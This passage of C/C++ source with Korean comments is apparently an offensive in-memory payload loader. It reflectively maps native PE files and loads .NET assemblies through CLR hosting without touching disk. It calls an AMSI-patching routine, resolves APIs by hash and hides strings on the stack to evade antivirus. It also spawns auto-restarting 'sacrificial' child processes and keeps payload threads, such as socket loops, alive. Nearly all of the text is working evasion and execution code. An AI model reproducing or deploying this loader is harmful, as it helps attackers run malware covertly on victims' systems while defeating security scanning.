    size_t off=(size_t)dos->e_lfanew;
    if(off>sz)return false;
    auto*n32=(const IMAGE_NT_HEADERS32*)((const BYTE*)b+off);
    if(*(const DWORD*)((const BYTE*)b+off)!=IMAGE_NT_SIGNATURE)return false;
    const IMAGE_DATA_DIRECTORY*clr=NULL;
    if(n32->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR64_MAGIC){
        auto*n64=(const IMAGE_NT_HEADERS64*)((const BYTE*)b+off);
        if(n64->OptionalHeader.NumberOfRvaAndSizes<=IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)return false;
        clr=&n64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else {
        if(n32->OptionalHeader.NumberOfRvaAndSizes<=IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)return false;
        clr=&n32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    }
    return clr&&clr->VirtualAddress&&clr->Size>=sizeof(IMAGE_COR20_HEADER);
}

/* ================================================================
 * Native PE 실행 (수동 매핑 + ExitProcess 인터셉트)
 * ================================================================ */
typedef struct _NPE {
    PVOID              Base;
    ULONG_PTR          ImgBase;
    PVOID              Entry;
    BOOL               Is64;
    BOOL               IsDLL;
    DWORD              ImgSize;
    WORD               NumSec;
    union { IMAGE_NT_HEADERS32* N32; IMAGE_NT_HEADERS64* N64; };
    IMAGE_SECTION_HEADER* Secs;
} NPE;

/* ExitProcess 대체: 페이로드 종료 시도를 무시하고 스레드만 정리 */
static HANDLE g_NativeThread = NULL;
static VOID WINAPI FakeExitProcess(UINT code){
    LOG("[!] Payload called ExitProcess(%u) — intercepted\n",code);
    DWORD tid=GetCurrentThreadId();
    if(g_NativeThread&&tid==GetThreadId(g_NativeThread)) ExitThread(code);
    for(;;) Sleep(1000); /* 다른 스레드 경로는 무한 대기 */
}

static IMAGE_DATA_DIRECTORY* NDir(NPE* p,DWORD i){
    return p->Is64? &p->N64->OptionalHeader.DataDirectory[i]
                 : &p->N32->OptionalHeader.DataDirectory[i];
}
static DWORD NEP(NPE* p){ return p->Is64? p->N64->OptionalHeader.AddressOfEntryPoint
                                        : p->N32->OptionalHeader.AddressOfEntryPoint; }

static bool NParse(void* d,size_t sz,NPE* p){
    if(sz<sizeof(IMAGE_DOS_HEADER))return false;
    auto*dos=(IMAGE_DOS_HEADER*)d;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE||dos->e_lfanew<=0)return false;
    if((size_t)dos->e_lfanew+sizeof(IMAGE_NT_HEADERS)>sz)return false;
    auto*nt=(IMAGE_NT_HEADERS*)((BYTE*)d+dos->e_lfanew);
    if(nt->Signature!=IMAGE_NT_SIGNATURE)return false;
    if(nt->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR64_MAGIC){
        p->Is64=true;  p->N64=(IMAGE_NT_HEADERS64*)nt;
        p->ImgBase=(ULONG_PTR)p->N64->OptionalHeader.ImageBase;
        p->ImgSize=p->N64->OptionalHeader.SizeOfImage;
        p->NumSec =p->N64->FileHeader.NumberOfSections;
        p->IsDLL  =(p->N64->FileHeader.Characteristics&IMAGE_FILE_DLL)!=0;
    } else if(nt->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR32_MAGIC){
        p->Is64=false; p->N32=(IMAGE_NT_HEADERS32*)nt;
        p->ImgBase=(ULONG_PTR)p->N32->OptionalHeader.ImageBase;
        p->ImgSize=p->N32->OptionalHeader.SizeOfImage;
        p->NumSec =p->N32->FileHeader.NumberOfSections;
        p->IsDLL  =(p->N32->FileHeader.Characteristics&IMAGE_FILE_DLL)!=0;
    } else return false;
    DWORD so=dos->e_lfanew+(p->Is64?sizeof(IMAGE_NT_HEADERS64):sizeof(IMAGE_NT_HEADERS32));
    if(so+(DWORD)p->NumSec*sizeof(IMAGE_SECTION_HEADER)>sz)return false;
    p->Secs=(IMAGE_SECTION_HEADER*)((BYTE*)d+so);
    LOG("[*] Native PE: %s, ImgBase=%p, Size=%lu\n",p->Is64?"x64":"x86",
        (PVOID)p->ImgBase,p->ImgSize);
    return true;
}

static bool NMap(void* d,size_t sz,NPE* p){
    if(!NParse(d,sz,p))return false;
    auto pVA=(fn_VA)HAPI(L"kernel32.dll","VirtualAlloc");
    PVOID base=pVA((PVOID)p->ImgBase,p->ImgSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!base) base=pVA(NULL,p->ImgSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!base){LOG("[-] VirtualAlloc failed\n");return false;}
    p->Base=base;
    DWORD hs=p->Is64?p->N64->OptionalHeader.SizeOfHeaders:p->N32->OptionalHeader.SizeOfHeaders;
    memcpy(base,d,hs);
    auto*sec=p->Secs;
    for(WORD i=0;i<p->NumSec;i++,sec++){
        if(!sec->SizeOfRawData)continue;
        PVOID dst=(BYTE*)base+sec->VirtualAddress;
        PVOID src=(BYTE*)d+sec->PointerToRawData;
        DWORD n=sec->SizeOfRawData;
        if((size_t)sec->PointerToRawData+n>sz)n=(DWORD)(sz-sec->PointerToRawData);
        memcpy(dst,src,n);
        if(sec->Misc.VirtualSize>sec->SizeOfRawData)
            memset((BYTE*)dst+n,0,sec->Misc.VirtualSize-sec->SizeOfRawData);
    }
    p->Entry=(BYTE*)base+NEP(p);
    LOG("[+] Native mapped at %p (delta=%lld), EP=%p\n",base,
        (long long)((ULONG_PTR)base-p->ImgBase),p->Entry);
    return true;
}

static bool NReloc(NPE* p){
    auto*dir=NDir(p,IMAGE_DIRECTORY_ENTRY_BASERELOC);
    ULONG_PTR delta=(ULONG_PTR)p->Base-p->ImgBase;
    if(!dir->VirtualAddress||!dir->Size){
        if(delta!=0){LOG("[-] No reloc dir, cannot run at this base\n");return false;}
        return true;
    }
    if(!delta)return true;
    LOG("[*] Relocations (delta=%p)\n",(PVOID)delta);
    auto*r=(IMAGE_BASE_RELOCATION*)((BYTE*)p->Base+dir->VirtualAddress);
    BYTE*end=(BYTE*)r+dir->Size;
    while((BYTE*)r<end&&r->VirtualAddress&&r->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION)){
        BYTE*rb=(BYTE*)p->Base+r->VirtualAddress;
        WORD*rd=(WORD*)((BYTE*)r+sizeof(IMAGE_BASE_RELOCATION));
        DWORD n=(r->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
        for(DWORD i=0;i<n;i++){
            WORD t=rd[i]>>12,o=rd[i]&0xFFF;
#ifdef _WIN64
            if(t==IMAGE_REL_BASED_DIR64) *(PULONG_PTR)(rb+o)+=delta;
#else
            if(t==IMAGE_REL_BASED_HIGHLOW) *(PULONG)(rb+o)+=(ULONG)delta;
#endif
            else if(t==IMAGE_REL_BASED_HIGH) *(PULONG)(rb+o)+=(ULONG)(delta>>16);
            else if(t==IMAGE_REL_BASED_LOW)  *(PULONG)(rb+o)+=(ULONG)(delta&0xFFFF);
        }
        r=(IMAGE_BASE_RELOCATION*)((BYTE*)r+r->SizeOfBlock);
    }
    return true;
}

static bool NImports(NPE* p){
    auto*dir=NDir(p,IMAGE_DIRECTORY_ENTRY_IMPORT);
    if(!dir->VirtualAddress||!dir->Size)return true;
    auto pLL=(fn_LL)HAPI(L"kernel32.dll","LoadLibraryA");
    auto pGA=HAPI(L"kernel32.dll","GetProcAddress");
    LOG("[*] Imports...\n");
    auto*desc=(IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)p->Base+dir->VirtualAddress);
    while(desc->Name){
        char*dll=(char*)((BYTE*)p->Base+desc->Name);
        HMODULE hm=pLL(dll);
        if(!hm){LOG("[-] LoadLibrary failed: %s\n",dll);return false;}
        auto*ot=(IMAGE_THUNK_DATA*)((BYTE*)p->Base+desc->OriginalFirstThunk);
        auto*ft=(IMAGE_THUNK_DATA*)((BYTE*)p->Base+desc->FirstThunk);
        if(!desc->OriginalFirstThunk) ot=ft;
        while(ot->u1.AddressOfData){
            FARPROC fn;
            if(IMAGE_SNAP_BY_ORDINAL(ot->u1.Ordinal))
                fn=((FARPROC(WINAPI*)(HMODULE,LPCSTR))pGA)(hm,(LPCSTR)IMAGE_ORDINAL(ot->u1.Ordinal));
            else{
                auto*ibn=(IMAGE_IMPORT_BY_NAME*)((BYTE*)p->Base+(ULONG_PTR)ot->u1.AddressOfData);
                fn=((FARPROC(WINAPI*)(HMODULE,LPCSTR))pGA)(hm,ibn->Name);
            }
            if(!fn){LOG("[-] Unresolved import in %s\n",dll);return false;}
            /* [핵심] ExitProcess → FakeExitProcess 로 리다이렉트 */
            if(_stricmp(dll,"kernel32.dll")==0||_stricmp(dll,"KERNEL32.DLL")==0){
                /* 이름 기반 비교는 thunk 단계에서 이미 끝났으므로,
                   여기서는 ord/name 무관하게 후킹 불가 → 별도 패스 필요.
                   대신 GetProcAddress 결과가 ExitProcess 주소와 같으면 교체 */
                HMODULE k32=GetModuleHandleA("kernel32.dll");
                if(fn==GetProcAddress(k32,"ExitProcess")){
                    fn=(FARPROC)FakeExitProcess;
                    LOG("[+] ExitProcess import hooked\n");
                }
            }
            ft->u1.Function=(ULONG_PTR)fn;
            ot++;ft++;
        }
        desc++;
    }
    return true;
}

static void NProtect(NPE* p){
    auto pVP=(fn_VP)HAPI(L"kernel32.dll","VirtualProtect");
    auto*sec=p->Secs;
    for(WORD i=0;i<p->NumSec;i++,sec++){
        DWORD prot=PAGE_NOACCESS,old;
        if(sec->Characteristics&IMAGE_SCN_MEM_EXECUTE)
            prot=(sec->Characteristics&IMAGE_SCN_MEM_WRITE)?PAGE_EXECUTE_READWRITE
               :(sec->Characteristics&IMAGE_SCN_MEM_READ)?PAGE_EXECUTE_READ:PAGE_EXECUTE;
        else if(sec->Characteristics&IMAGE_SCN_MEM_WRITE) prot=PAGE_READWRITE;
        else if(sec->Characteristics&IMAGE_SCN_MEM_READ)  prot=PAGE_READONLY;
        if(prot!=PAGE_NOACCESS)
            pVP((BYTE*)p->Base+sec->VirtualAddress,sec->Misc.VirtualSize,prot,&old);
    }
}

static void NTls(NPE* p){
    auto*dir=NDir(p,IMAGE_DIRECTORY_ENTRY_TLS);
    if(!dir->VirtualAddress||!dir->Size)return;
    auto*tls=(IMAGE_TLS_DIRECTORY*)((BYTE*)p->Base+dir->VirtualAddress);
    if(!tls->AddressOfCallBacks)return;
    LOG("[*] TLS callbacks...\n");
    auto**cbs=(PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    while(*cbs){(*cbs)(p->Base,DLL_PROCESS_ATTACH,NULL);cbs++;}
}

/* EXE와 DLL은 진입점 계약이 다르므로 호출 규약을 분리한다.
 * 일반 함수 호출을 사용하면 컴파일러가 x64 shadow space, 16-byte 정렬,
 * 반환 주소를 모두 올바르게 보존한다. */
static int NCall(PVOID ep,PVOID base,BOOL isDll){
    if(isDll){
        auto dllEntry=(BOOL(WINAPI*)(HINSTANCE,DWORD,LPVOID))ep;
        return dllEntry((HINSTANCE)base,DLL_PROCESS_ATTACH,NULL)?0:-1;
    }
    auto exeEntry=(void(WINAPI*)(void))ep;
    exeEntry();
    return 0;
}

static DWORD WINAPI NativeThread(LPVOID lp){
    NPE* p=(NPE*)lp;
    LOG("[+] Native entry executing...\n");
    int r=-1;
    __try{ r=NCall(p->Entry,p->Base,p->IsDLL); LOG("[*] Native entry returned %d\n",r);}
    __except(EXCEPTION_EXECUTE_HANDLER){LOG("[-] Native exception: %08lx\n",GetExceptionCode());}
    return 0;
}

static bool RunNative(char* data,DWORD sz){
#ifdef _WIN64
    NPE pe{};
    if(!NMap(data,sz,&pe))return false;
    if(!pe.Is64){LOG("[-] x86 PE in x64 loader — build loader as Win32\n");
        VirtualFree(pe.Base,0,MEM_RELEASE);return false;}
    if(!NReloc(&pe)||!NImports(&pe)){VirtualFree(pe.Base,0,MEM_RELEASE);return false;}
    NTls(&pe);
    Sleep(500+rand()%500);
    NProtect(&pe);
    auto pCT=(fn_CT)HAPI(L"kernel32.dll","CreateThread");
    auto pWFS=(fn_WFS)HAPI(L"kernel32.dll","WaitForSingleObject");
    HANDLE t=pCT(NULL,0,NativeThread,&pe,0,NULL);
    if(!t){LOG("[-] CreateThread failed\n");VirtualFree(pe.Base,0,MEM_RELEASE);return false;}
    g_NativeThread=t;
    pWFS(t,INFINITE); /* 페이로드 스레드가 끝날 때까지 (ExitProcess는 이미 후크됨) */
    /* 메모리는 프로세스 수명 동안 유지 — 해제하지 않음 (페이로드 스레드 잔존 가능) */
    return true;
#else
    LOG("[-] Native x64 requires x64 loader build\n");
    return false;
#endif
}

/* ================================================================
 * Managed PE 실행 (documented CLR/OLE import)
 * ================================================================ */
static const GUID CLSID_MetaHost_  ={0x9280188D,0x0E8E,0x4867,{0xB3,0x0C,0x7F,0xA8,0x38,0x84,0xE8,0xDE}};
static const GUID IID_MetaHost_    ={0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
static const GUID IID_RTInfo_      ={0xBD39D1D2,0xBA2F,0x486A,{0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
static const GUID CLSID_CORHost_   ={0xCB2F6723,0xAB3A,0x11D2,{0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E}};
static const GUID IID_CORHost_     ={0xCB2F6722,0xAB3A,0x11D2,{0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E}};
static const GUID IID_AppDomain_   ={0x05F696DC,0x2B29,0x3663,{0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13}};

static void* Vtbl(void*o,size_t i){return(*(void***)o)[i];}

enum : size_t {
    VTBL_META_GET_RUNTIME        = 3,
    VTBL_INFO_GET_INTERFACE      = 9,
    VTBL_INFO_IS_LOADABLE        = 10,
    VTBL_HOST_START              = 10,
    VTBL_HOST_STOP               = 11,
    VTBL_HOST_GET_DEFAULT_DOMAIN = 13,
    VTBL_APPDOMAIN_LOAD_3        = 45,
    VTBL_ASSEMBLY_ENTRY_POINT    = 16,
    VTBL_METHODINFO_INVOKE_3     = 37
};

static bool RunManaged(char*data,DWORD sz){
    auto pCoInit   = &CoInitializeEx;
    auto pCoUninit = &CoUninitialize;
    auto pCLRCr    = &CLRCreateInstance;
    auto pSACV     = &SafeArrayCreateVector;
    auto pSAAD     = &SafeArrayAccessData;
    auto pSAUAD    = &SafeArrayUnaccessData;
    auto pSAD      = &SafeArrayDestroy;
    auto pSAPE     = &SafeArrayPutElement;
    auto pVInit    = &VariantInit;
    auto pVClr     = &VariantClear;
    auto pVCT      = &VariantChangeType;

    bool comInit=false;
    void *meta=NULL,*info=NULL,*host=NULL;
    IUnknown*unkDom=NULL; IDispatch*dom=NULL,*asm_=NULL,*ep=NULL;
    bool ok=false; LONG ret=0;
    const char*stage="CoInitializeEx";

    HRESULT hr=pCoInit(NULL,COINIT_APARTMENTTHREADED);
    if(SUCCEEDED(hr))comInit=true; else if(hr!=RPC_E_CHANGED_MODE)return false;

    stage="CLRCreateInstance";
    hr=pCLRCr(CLSID_MetaHost_,IID_MetaHost_,(LPVOID*)&meta); if(FAILED(hr))goto cl;
    stage="ICLRMetaHost::GetRuntime";
    {typedef HRESULT(STDMETHODCALLTYPE*fnGR)(void*,LPCWSTR,REFIID,LPVOID*);
     hr=((fnGR)Vtbl(meta,VTBL_META_GET_RUNTIME))(meta,L"v4.0.30319",IID_RTInfo_,(LPVOID*)&info);} if(FAILED(hr))goto cl;
    stage="ICLRRuntimeInfo::IsLoadable";
    {typedef HRESULT(STDMETHODCALLTYPE*fnIL)(void*,BOOL*); BOOL ld=FALSE;
     hr=((fnIL)Vtbl(info,VTBL_INFO_IS_LOADABLE))(info,&ld); if(FAILED(hr)||!ld){if(SUCCEEDED(hr))hr=E_FAIL;goto cl;}}
    stage="ICLRRuntimeInfo::GetInterface";
    {typedef HRESULT(STDMETHODCALLTYPE*fnGI)(void*,REFCLSID,REFIID,LPVOID*);
     hr=((fnGI)Vtbl(info,VTBL_INFO_GET_INTERFACE))(info,CLSID_CORHost_,IID_CORHost_,(LPVOID*)&host);} if(FAILED(hr))goto cl;
    stage="ICorRuntimeHost::Start";
    {typedef HRESULT(STDMETHODCALLTYPE*fnSt)(void*);
     hr=((fnSt)Vtbl(host,VTBL_HOST_START))(host);} if(FAILED(hr))goto cl;
    stage="ICorRuntimeHost::GetDefaultDomain";
    {typedef HRESULT(STDMETHODCALLTYPE*fnGDD)(void*,IUnknown**);
     hr=((fnGDD)Vtbl(host,VTBL_HOST_GET_DEFAULT_DOMAIN))(host,&unkDom);} if(FAILED(hr))goto cl;
    stage="QueryInterface(_AppDomain)";
    hr=unkDom->QueryInterface(IID_AppDomain_,(void**)&dom); if(FAILED(hr))goto cl;

    stage="_AppDomain::Load_3";
    {SAFEARRAY*bytes=pSACV(VT_UI1,0,sz); if(!bytes){hr=E_OUTOFMEMORY;goto cl;}
     BYTE*dst=NULL; hr=pSAAD(bytes,(void**)&dst);
     if(SUCCEEDED(hr)){memcpy(dst,data,sz);pSAUAD(bytes);
         typedef HRESULT(STDMETHODCALLTYPE*fnL)(void*,SAFEARRAY*,void**);
         hr=((fnL)Vtbl(dom,VTBL_APPDOMAIN_LOAD_3))(dom,bytes,(void**)&asm_);}
     pSAD(bytes);} if(FAILED(hr))goto cl;

    stage="_Assembly::get_EntryPoint";
    {typedef HRESULT(STDMETHODCALLTYPE*fnGEP)(void*,void**);
     hr=((fnGEP)Vtbl(asm_,VTBL_ASSEMBLY_ENTRY_POINT))(asm_,(void**)&ep);} if(FAILED(hr)||!ep){if(SUCCEEDED(hr))hr=E_FAIL;goto cl;}

    stage="_MethodInfo::Invoke_3";
    for(int att=0;att<2&&!ok;att++){
        SAFEARRAY*params=pSACV(VT_VARIANT,0,att==1?1:0); if(!params)continue;
        if(att==1){
            SAFEARRAY*args=pSACV(VT_BSTR,0,0);
            VARIANT arg; pVInit(&arg); V_VT(&arg)=VT_ARRAY|VT_BSTR; V_ARRAY(&arg)=args;
            LONG idx=0; if(pSAPE)pSAPE(params,&idx,&arg); pVClr(&arg);
        }
        VARIANT tgt,res; pVInit(&tgt); pVInit(&res); V_VT(&tgt)=VT_NULL;
        typedef HRESULT(STDMETHODCALLTYPE*fnInv)(void*,VARIANT,SAFEARRAY*,VARIANT*);
        fflush(stdout);
        hr=((fnInv)Vtbl(ep,VTBL_METHODINFO_INVOKE_3))(ep,tgt,params,&res);
        if(SUCCEEDED(hr)){ok=true;
            if(pVCT){VARIANT cv;pVInit(&cv);if(SUCCEEDED(pVCT(&cv,&res,0,VT_I4)))ret=V_I4(&cv);pVClr(&cv);}
        }
        pVClr(&res); pSAD(params);
    }
cl:
#if FEATURE_KEEP_CLR_ALIVE
    if(ok){
        /*
         * [핵심 수정] Main이 리턴했어도 페이로드의 백그라운드 스레드
         * (소켓 수신 루프 등)가 살아있을 수 있음.
         * CLR 호스트를 Stop/해제하면 그 스레드들이 전부 죽는다.
         * → 런타임을 그대로 두고 무한 대기. 프로세스는 페이로드가
         *   Environment.Exit로 직접 죽이지 않는 한 계속 산다.
         */
        LOG("[+] Main returned (ret=%ld) — keeping CLR alive for background threads\n",ret);
        LOG("[*] Waiting indefinitely (payload threads still running)...\n");
        HANDLE hNever = CreateEventA(NULL, TRUE, FALSE, NULL);
        if(hNever) WaitForSingleObject(hNever, INFINITE);
        /* 이 지점에 도달하지 않음 */
    }
#endif
    /* 실패 시에만 정리 */
    if(ep)ep->Release(); if(asm_)asm_->Release(); if(dom)dom->Release(); if(unkDom)unkDom->Release();
    if(host){typedef HRESULT(STDMETHODCALLTYPE*fnSt)(void*);((fnSt)Vtbl(host,VTBL_HOST_STOP))(host);((IUnknown*)host)->Release();}
    if(info)((IUnknown*)info)->Release(); if(meta)((IUnknown*)meta)->Release();
    if(comInit&&pCoUninit)pCoUninit();
    LOG("[-] Managed failed at %s (hr=0x%08lX)\n",stage,(unsigned long)hr);
    return ok;
}

/* ================================================================
 * main
 * ================================================================ */
/* 자식(희생) 프로세스 여부 */
static BOOL g_IsChild = FALSE;

/* 부모: 자식 종료 시 자동 재시작 (--loop) */
static BOOL g_AutoRestart = FALSE;

static void EnsureConsole(void){
    /* GUI로 시작되어도 C# Console 입출력이 동작하게 콘솔 확보 */
    if(!AttachConsole(ATTACH_PARENT_PROCESS)){
        AllocConsole();
    }
    freopen("CONOUT$","w",stdout);
    freopen("CONOUT$","w",stderr);
    freopen("CONIN$","r",stdin);
}

int main(int argc, char** argv){
    LOG("[i] loader start\n");
    EnsureConsole();

    /* ── 자식 모드: 실제 페이로드 실행 (희생 프로세스) ── */
    for(int i=1;i<argc;i++){
        if(_stricmp(argv[i],"--child")==0)  g_IsChild=TRUE;
        if(_stricmp(argv[i],"--loop")==0)   g_AutoRestart=TRUE;
    }

    /* AMSI L0~L4 다층 패치 */
#if FEATURE_AMSI_L1 || FEATURE_AMSI_L2 || FEATURE_AMSI_L3 || FEATURE_AMSI_L4
    PatchAMSI();
#endif

    STKSTR(sFile,"file");
    STKSTR(sRun,"--run");
    if(argc<3||_stricmp(argv[1],sFile)!=0){
        LOG("Usage: %s file <hsf> [--run]\n",argv[0]);
        return 1;
    }

    bool run=false;
    for(int i=3;i<argc;i++) if(_stricmp(argv[i],sRun)==0) run=true;

    DATA payload=LoadHSF(argv[2]);
    if(!payload.data||!payload.len) return 2;

    if(!run){
        LOG("[*] Decode-only mode. Add --run to execute.\n");
        free(payload.data);
        return 0;
    }

    bool isMgd=IsMgd(payload.data,payload.len);
    LOG("[*] Payload type: %s\n", isMgd?"Managed (C#)":"Native (C/C++)");

    bool ok=false;
    if(isMgd){
        LOG("[*] Managed path\n");
#if FEATURE_CHILD_ISOLATION
        if(!g_IsChild){
            /* ── 부모 모드: 희생 자식 프로세스 생성 ──
             * 자식이 Environment.Exit로 죽어도 부모(이 로더)는 살아남고
             * payload는 디스크에 떨어지지 않은 채 자식 메모리에서 실행됨.
             * 사용법: --loop 추가 시 자식이 죽으면 자동 재시작.
             */
            LOG("[*] Spawning sacrificial child process...\n");
            SecureErase(payload.data,payload.len);
            free(payload.data);

            char selfPath[MAX_PATH]{};
            GetModuleFileNameA(NULL,selfPath,MAX_PATH);

            char cmd[MAX_PATH*2]{};
            _snprintf(cmd,sizeof(cmd),"\"%s\" file \"%s\" --run --child%s",
                      selfPath,argv[2],g_AutoRestart?" --loop":"");

            do {
                STARTUPINFOA si{}; PROCESS_INFORMATION pi{};
                si.cb=sizeof(si);
                if(!CreateProcessA(NULL,cmd,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)){
                    LOG("[-] CreateProcess failed: %lu\n",GetLastError());
                    return 2;
                }
                LOG("[+] Child PID: %lu (parent alive)\n",pi.dwProcessId);
                WaitForSingleObject(pi.hProcess,INFINITE);
                DWORD code=1; GetExitCodeProcess(pi.hProcess,&code);
                CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                LOG("[*] Child exited with code %lu%s\n",code,
                    g_AutoRestart?" — restarting...":"");
                if(!g_AutoRestart) break;
                Sleep(1000); /* 재시작 전 짧은 유예 */
            } while(g_AutoRestart);
            LOG("[+] Parent done (payload lifetime managed)\n");
            return 0;
        }
#endif
        /* 자식 모드: 여기서 진짜 실행. 죽어도 부모가 살아있음 */
        ok=RunManaged((char*)payload.data,(DWORD)payload.len);
    } else {
        LOG("[*] Native path\n");
#if FEATURE_CHILD_ISOLATION
        if(!g_IsChild){
            /* 부모: 희생 자식 생성 (Environment.Exit / ExitProcess 모두 격리) */
            LOG("[*] Spawning sacrificial child process...\n");
            SecureErase(payload.data,payload.len);
            free(payload.data);
            char selfPath[MAX_PATH]{};
            GetModuleFileNameA(NULL,selfPath,MAX_PATH);
            char cmd[MAX_PATH*2]{};
            _snprintf(cmd,sizeof(cmd),"\"%s\" file \"%s\" --run --child%s",
                      selfPath,argv[2],g_AutoRestart?" --loop":"");
            do{
                STARTUPINFOA si{};PROCESS_INFORMATION pi{};si.cb=sizeof(si);
                if(!CreateProcessA(NULL,cmd,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)){
                    LOG("[-] CreateProcess failed: %lu\n",GetLastError());return 2;}
                LOG("[+] Child PID: %lu\n",pi.dwProcessId);
                WaitForSingleObject(pi.hProcess,INFINITE);
                DWORD code=1;GetExitCodeProcess(pi.hProcess,&code);
                CloseHandle(pi.hThread);CloseHandle(pi.hProcess);
                LOG("[*] Child exited (%lu)%s\n",code,g_AutoRestart?" — restarting...":"");
                if(!g_AutoRestart)break;
                Sleep(1000);
            }while(g_AutoRestart);
            LOG("[+] Parent done\n");
            return 0;
        }
#endif
        ok=RunNative((char*)payload.data,(DWORD)payload.len);
    }

    SecureErase(payload.data,payload.len);
    free(payload.data);
    LOG(ok?"[+] Done\n":"[-] Failed\n");
    return ok?0:2;
}
